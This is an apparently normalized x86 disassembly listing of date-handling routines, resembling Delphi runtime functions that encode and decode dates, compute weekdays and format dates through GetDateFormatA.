mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_40949c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_4095a0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_40938c
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407980
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407980
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407980
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_40949c
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_4096ec
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_4095a0
pop esi
pop ecx
pop ebp
retn 0x8
sub_40970c
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_40938c
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409748
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028b8
sub_40978c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_40421c
mov edx eax
mov eax ebx
call sub_409748
pop ecx
pop ebx
pop ebp
retn
sub_4097ac
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408778
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409748
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4097f8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409824
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_4096ec
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_40985c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_409440
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_40989c
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4099ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f5c
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403ff4
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40441c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4099f1
lea eax [ ebp - 0x118 ]
call sub_403f5c
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4041cc
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_40421c
mov edx eax
mov eax [ ebx ]
call sub_40bde0
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40bf54
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_40447c
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40bef0
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404154
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40bf54
mov ecx eax
mov eax ebx
mov edx esi
call sub_40404c
sub_409a04
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409ae2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f5c
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403ff4
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403ff4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409ae9
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4041cc
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40441c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_40421c
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_40447c
sub_409b0c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a28d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a294
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403f80
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40bfd4
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40bfb4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409748
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40bfd4
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409748
pop ecx
mov al [ eax + lookup_table_409bef ]
jmp [ eax * 4 + jump_table_409c28 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_4097f8
pop ecx
push ebp
call sub_409824
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_4097f8
pop ecx
push ebp
call sub_409824
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_40989c
pop ecx
mov eax [ ebp - 0x24 ]
call sub_40978c
pop ecx
jmp r-xdata
push ebp
call sub_4097f8
pop ecx
push ebp
call sub_409824
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409a04
pop ecx
mov eax [ ebp - 0x28 ]
call sub_40978c
pop ecx
jmp r-xdata
push ebp
call sub_4097f8
pop ecx
push ebp
call sub_409824
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_4097f8
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_4097f8
pop ecx
push ebp
call sub_40985c
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_4097f8
pop ecx
push ebp
call sub_40985c
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_4097f8
pop ecx
push ebp
call sub_40985c
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_4097f8
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_4097f8
pop ecx
push ebp
call sub_40985c
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_40985c
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4085e8
test eax eax
jne r-xdata
push ebp
call sub_4097f8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b0c
pop ecx
push ebp
call sub_40985c
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_4097ac
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_4097ac
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4097ac
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409824
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_4097ac
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_4097ac
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_4097ac
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b0c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b0c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4097ac
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4085e8
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409748
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b0c
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409748
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409748
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40978c
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40970c
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40978c
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4085e8
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409748
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409748
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40978c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40970c
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40978c
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40bfd4
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4085e8
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409748
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b0c
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_4097ac
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4085e8
test eax eax
jne r-xdata
push ebp
call sub_409824
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40970c
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40978c
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40978c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40978c
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40bfd4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b0c
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409748
pop ecx
jmp r-xdata
push ebp
call sub_409824
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40970c
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40978c
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4085e8
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4085e8
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4085e8
test eax eax
jne r-xdata
jmp r-xdata
sub_40a2c0
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409b0c
pop ecx
push ebp
mov eax ebx
call sub_409b0c
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_40404c
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a330
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_40421c
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a354
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a330
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_40421c
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a3e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a461
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a468
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a330
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_40421c
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_40447c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407bbc
test eax eax
jne r-xdata
mov eax edi
call sub_40421c
add [ esi ] eax
mov bl 0x1
sub_40a474
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a330
mov eax esi
call sub_40421c
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a4ac
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_40421c
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a4f8
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_40421c
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c018
mov [ ebx ] eax
jmp r-xdata
sub_40a540
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40441c
push eax
mov eax [ ebx ]
call sub_40441c
pop edx
call sub_40c08c
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a594
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409734
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a5f0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a90b
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a4ac
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c054
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a354
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a4f8
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_40447c
